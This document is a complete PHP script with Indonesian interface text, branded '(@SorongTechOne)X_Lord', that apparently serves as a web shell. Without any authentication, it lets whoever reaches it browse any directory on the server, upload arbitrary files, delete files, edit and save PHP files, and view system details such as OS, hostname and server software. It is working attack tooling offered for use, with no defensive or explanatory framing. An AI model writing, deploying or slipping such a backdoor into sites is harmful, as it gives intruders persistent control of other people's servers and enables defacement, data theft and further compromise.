
<?php
$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$real = realpath($path);
if ($real === false) $real = __DIR__;
$path = $real;

$uploadMsg = "";
$actionMsg = "";

// === Handle Upload ===
if (isset($_POST["upload"]) && isset($_FILES["file"])) {
    $targetDir = $path . DIRECTORY_SEPARATOR;
    $targetFile = $targetDir . basename($_FILES["file"]["name"]);

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
        $uploadMsg = "<span class='text-success'>✅ File berhasil diupload ke $path</span>";
    } else {
        $uploadMsg = "<span class='text-danger'>❌ Gagal upload file!</span>";
    }
}

// === Handle Delete ===
if (isset($_GET['delete'])) {
    $delFile = $path . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (is_file($delFile)) {
        if (@unlink($delFile)) {
            $actionMsg = "<span class='text-success'>🗑️ File berhasil dihapus!</span>";
        } else {
            $actionMsg = "<span class='text-danger'>❌ Gagal hapus file!</span>";
        }
    }
}

// === Handle Edit Save ===
// === Handle Edit Save ===
if (isset($_POST['save_file']) && isset($_POST['filename'])) {
    $editFile = $path . DIRECTORY_SEPARATOR . basename($_POST['filename']);
    $content = isset($_POST['content']) ? $_POST['content'] : "";
    if (is_file($editFile)) {
        if (file_put_contents($editFile, $content) !== false) {
            $actionMsg = "<span class='text-success'>✏️ File berhasil disimpan!</span>";
        } else {
            $actionMsg = "<span class='text-danger'>❌ Gagal simpan file!</span>";
        }
    }
}


// === List Files ===
$items = @scandir($path) ?: [];
$folders = [];
$files = [];
foreach ($items as $item) {
    if ($item === ".") continue;
    $full = $path . DIRECTORY_SEPARATOR . $item;
    if (is_dir($full)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}
$list = array_merge($folders, $files);
$parent = dirname($path);

// === System Info ===
// === System Info ===
$system = [
    "OS" => php_uname("s") . " " . php_uname("r"),
    "Host" => php_uname("n"),
    "Arch" => php_uname("m"),
    "PHP" => phpversion(),
    "Server" => isset($_SERVER["SERVER_SOFTWARE"]) ? $_SERVER["SERVER_SOFTWARE"] : "CLI / Unknown"
];


// === Cek Mode Edit ===
$editMode = false;
$editFileContent = "";
$editFileName = "";
if (isset($_GET['edit'])) {
    $editFileName = basename($_GET['edit']);
    $editFilePath = $path . DIRECTORY_SEPARATOR . $editFileName;
    $ext = strtolower(pathinfo($editFileName, PATHINFO_EXTENSION));
    if (is_file($editFilePath) && in_array($ext, ['php','txt','html'])) {
        $editMode = true;
        $editFileContent = htmlspecialchars(file_get_contents($editFilePath));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>@SorongTechOne</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background:#000; color:#fff; }
        .card { background:#111; border:2px solid red; max-width: 95vw; }
        .table-container { max-height: 55vh; overflow-y: auto; }
        .table { background:#222; margin:0; }
        .table thead { background:red; color:#fff; position: sticky; top: 0; z-index: 1; }
        .folder { color:#ff5555; font-weight:bold; }
        .file { color:#ddd; }
        a { text-decoration:none; color:inherit; }
        .sysinfo { background:#222; border-radius:8px; padding:10px; margin-bottom:15px; }
        textarea { width:100%; height:60vh; background:#111; color:#fff; border:1px solid red; }
    </style>
    <script>
        function confirmDelete(file) {
            return confirm("Yakin mau hapus file: " + file + " ?");
        }
    </script>
</head>
<body class="d-flex justify-content-center p-4">
    <div class="card shadow-lg w-100">
        <div class="card-body">
            <h2 class="card-title text-center text-danger mb-3">(@SorongTechOne)X_Lord</h2>
            
            <!-- Info Sistem -->
            <div class="sysinfo text-light">
                <strong>🖥️ System Info</strong><br>
                OS: <?php echo $system["OS"]; ?><br>
                Host: <?php echo $system["Host"]; ?><br>
                Arch: <?php echo $system["Arch"]; ?><br>
                PHP: <?php echo $system["PHP"]; ?><br>
                Server: <?php echo $system["Server"]; ?><br>
            </div>

            <!-- Pesan -->
            <?php if ($uploadMsg) echo "<div class='mb-2'>$uploadMsg</div>"; ?>
            <?php if ($actionMsg) echo "<div class='mb-2'>$actionMsg</div>"; ?>

            <?php if ($editMode): ?>
                <!-- Edit File -->
                <h5 class="text-warning">✏️ Edit File: <?php echo htmlspecialchars($editFileName); ?></h5>
                <form method="post" action="?path=<?php echo urlencode($path); ?>">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFileName); ?>">
                    <textarea name="content"><?php echo $editFileContent; ?></textarea>
                    <div class="mt-2">
                        <button type="submit" name="save_file" class="btn btn-success">💾 Simpan</button>
                        <a href="?path=<?php echo urlencode($path); ?>" class="btn btn-secondary">❌ Batal</a>
                    </div>
                </form>
            <?php else: ?>
                <!-- Upload Form -->
                <div class="mb-3">
                    <form method="post" enctype="multipart/form-data" action="?path=<?php echo urlencode($path); ?>">
                        <div class="input-group">
                            <input type="file" class="form-control bg-dark text-light" name="file" required>
                            <button type="submit" name="upload" class="btn btn-danger">Upload</button>
                        </div>
                    </form>
                </div>

                <p class="text-center text-light">Path: <code><?php echo $path; ?></code></p>

                <div class="table-container">
                    <table class="table table-dark table-striped table-hover align-middle">
                        <thead>
                            <tr>
                                <th class="text-start">Nama</th>
                                <th class="text-center">Tipe</th>
                                <th class="text-center">Aksi</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if ($path !== dirname($path)): ?>
                                <tr>
                                    <td class="folder text-start">
                                        <a href="?path=<?php echo urlencode($parent); ?>">⬆️ ..</a>
                                    </td>
                                    <td class="text-center">Kembali</td>
                                    <td></td>
                                </tr>
                            <?php endif; ?>

                            <?php foreach ($list as $item): ?>
                                <?php $full = $path . DIRECTORY_SEPARATOR . $item; ?>
                                <?php if (is_dir($full)): ?>
                                    <tr>
                                        <td class="folder text-start">
                                            <a href="?path=<?php echo urlencode($full); ?>">📁 <?php echo htmlspecialchars($item); ?></a>
                                        </td>
                                        <td class="text-center">Folder</td>
                                        <td></td>
                                    </tr>
                                <?php else: ?>
                                    <?php $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION)); ?>
                                    <tr>
                                        <td class="file text-start">📄 <?php echo htmlspecialchars($item); ?></td>
                                        <td class="text-center">File</td>
                                        <td class="text-center">
                                            <?php if (in_array($ext, ['php','txt','html'])): ?>
                                                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($item); ?>" class="btn btn-sm btn-warning">✏️ Edit</a>
                                            <?php endif; ?>
                                            <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($item); ?>" class="btn btn-sm btn-danger" onclick="return confirmDelete('<?php echo htmlspecialchars($item); ?>')">🗑️ Hapus</a>
                                        </td>
                                    </tr>
                                <?php endif; ?>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
